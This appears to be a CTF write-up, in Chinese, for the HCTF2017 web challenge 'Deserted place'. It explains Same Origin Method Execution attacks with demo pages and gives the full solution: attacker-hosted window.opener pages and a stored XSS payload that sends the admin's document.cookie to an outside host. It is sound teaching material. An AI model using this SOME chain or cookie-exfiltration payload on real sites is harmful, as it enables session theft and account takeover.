---
title: HCTF2017-Deserted place-Writeup
date: 2017-11-15 17:31:15
tags:
- xss
---


```
Deserted place

Description 
maybe nothing here 
flag in admin cookie
Now Score 820.35
Team solved 3
```

出题思路来自于一个比较特别的叫做SOME的攻击方式，全名`Same Origin Method Execution`，这是一种2015年被人提出来的攻击方式，可以用来执行同源环境下的任意方法，2年前就有人做了分析。

[原paper](http://files.benhayak.com/Same_Origin_Method_Execution__paper.pdf)
[http://blog.safedog.cn/?p=13](http://blog.safedog.cn/?p=13)
[https://lightless.me/archives/same-origin-method-exection.html](https://lightless.me/archives/same-origin-method-exection.html)

题目源码如下
[https://github.com/LoRexxar/HCTF2017-Deserted-place](https://github.com/LoRexxar/HCTF2017-Deserted-place)

我们一起来研究一下

<!--more-->
# SOME？ #

首先我们一起来探究一个SOME是什么？

SOMe,Same Origin Method Execution,这是Ben Hayak 在 Black Hat Eorope 2014 演讲的题目。在随后的15年，公开了SOME相关的完整paper，其中讲述了和SOME相关的各种场景和利用思路。有兴趣的朋友可以去看看视频.

[https://www.youtube.com/watch?v=OvarkOxxdic](https://www.youtube.com/watch?v=OvarkOxxdic)

我们都知道jsonp是用来解决跨域处理数据问题的解决方案，但是也许会有这样一种情况出现，某个网站的某个富文本编辑器支持选择字体颜色，当你点击按钮的时候，会弹出类似于颜色点选器的轮盘网页，当你选择某一颜色时，这个颜色就会修改原页面的字体页面，这个接口或许是这样实现的。
```
http://a.com/color.php?callback=get_color
```
color.php的代码是这样的
```
<script>
function get_color(data) {
    // todo here
}
</script>

<script>
<?php echo $_GET['callback']."();"; ?>
</script>
```

当访问color.php的时候，页面就会自动执行`get_color`，这个页面和父页面同源，结构也和传统的jsonp接口不太一样，但这种情况完全有可能发生。

一般来说，我们可能会尝试在`get_color`尝试domxss，遗憾的是，大部分这样的接口都只允许`.\w+`的字符输入。

而SOME攻击，就是在这种场景下出现的，在callback这里的缺陷可以导致执行同源下的**任意**方法，值得注意的是，这种攻击方法并不是csrf，他可以完全模拟你的任何行为。

这种攻击方式有几个局限性:
1、受到返回头的影响，如果返回头为`Content-T ype: application/json`,则任何利用都不会生效。
2、攻击者没办法操作执行函数传入参数，或者可以说是比较难操作。
3、受到同源策略的限制，只能执行同源下的任意方法。

## 让我们来测试一下

首先我们需要一个站点来模拟一下

index.html
```
<form>
    <button onclick="c()">Secret Button</button>
    </form>
<script>
    function c() {
        alert("LoRexxar click!");
    }
</script>
```

jsonp.php
```
<?php
$callback = empty($_GET["callback"]) ? "jsCallback" : $_GET["callback"];

echo "<script>";
echo $callback . "()";
echo "</script>";
```

我们假设click是一个敏感的按钮，这种情况我们可以通过SOME来点击这个按钮来执行相应的js。

首先我们需要一个some1.html
```
<script>
    function start_some() {
        window.open("some2.html");
        location.replace("http://b.com/index.html");
    }

    setTimeout(start_some(), 1000);
</script>
```

其次需要一个some2.html
```
<script>
    function attack() {
        location.replace("http://b.com/jsonp.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click");
    }

    setTimeout(attack, 2000);

</script>
```

当我们打开some1.html的时候，c函数成功被执行了

![image.png-32.4kB][1]

这种攻击方式在大型站点越发的常见，SOME的作者举例子就用了wordpress的一个漏洞，通过接口可以在wordpress中安装想要的插件，导致getshell等更严重的漏洞。

# Deserted place Writeup #
回到题目。

打开题目主要功能有限：
1、登陆
2、注册
3、修改个人信息（修改个人信息后按回车更新自己的信息）、
4、获取随机一个人的信息，并把它的信息更新给我自己

简单测试可以发现，个人信息页面存在self-xss，但问题就在于怎么能更新admin的个人信息。

仔细回顾站内的各种信息，我们能发现所有的更新个人信息都是通过开启子窗口来实现的。

edit.php里面有一个类似于jsonp的接口可以执行任意函数，简单测试可以发现这里正则匹配了`.\w+`，这意味这我们只能执行已有的js函数，我们可以看看后台的代码。
```
$callback = $_GET['callback'];	
preg_match("/\w+/i", $callback, $matches);

...

echo "<script>";
echo $matches[0]."();";
echo "</script>";
```

已有的函数一共有3个
```
function UpdateProfile(){
	var username = document.getElementById('user').value;
	var email = document.getElementById('email').value;
	var message = document.getElementById('mess').value;

	window.opener.document.getElementById("email").innerHTML="Email: "+email;
	window.opener.document.getElementById("mess").innerHTML="Message: "+message;

	console.log("Update user profile success...");
	window.close();
}

function EditProfile(){
	document.onkeydown=function(event){
		if (event.keyCode == 13){
			UpdateProfile();
		}
	}
}

function RandomProfile(){
	setTimeout('UpdateProfile()', 1000);
}
```

如果执行`UpdateProfile`，站内就会把子窗口的内容发送到父窗口中。但是我们还是没办法控制修改的内容。

回顾站内逻辑，当我们点击click me，首先请求`/edit.php?callback=RandomProfile`，然后跳转至任意`http://hctf.com/edit.php?callback=RandomProfile&user=xiaoming`，然后页面关闭并，更新信息到当前用户上，假设这里user是我们设定的还有恶意代码的user，那我们就可以修改admin的信息了，但，怎么能让admin打开这个页面呢？

我们可以尝试一个，如果直接打开`edit.php?callback=RandomProfile&user=xiaoming`
![image.png-7.7kB][2]

报错了，不是通过open打开的页面，寻找不到页面内的`window.opener`对象，也就没办法做任何事。

这里我们只有通过SOME，才能操作同源下的父窗口，首先我们得熟悉同源策略，同源策略规定，只有同源下的页面才能相互读写，如果通过`windows.open`打开的页面是同源的，那么我们就可以通过`window.opener`对象来操作父子窗口。

而SOME就是基于这种特性，可以执行同源下的任意方法。

最终payload：

vps, 1.html
```
<script>
    function start_some() {
        window.open("2.html");
        location.replace("http://desert.2017.hctf.io/user.php");
    }

    setTimeout(start_some(), 1000);
</script>
```

vps, 2.html
```
<script>
    function attack() {
        location.replace("http://desert.2017.hctf.io/edit.php?callback=RandomProfile&user=lorexxar");
    }

    setTimeout(attack, 2000);

</script>
```

在lorexxar账户的message里添加payload
```

<img src="\" onerror=window.location.href='http://0xb.pw?cookie='%2bdocument.cookie>
```

getflag!


  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/tzbaummy81p4ycznfzj0ladl/image.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/ik54i9k8irjz1biosk5xnunu/image.png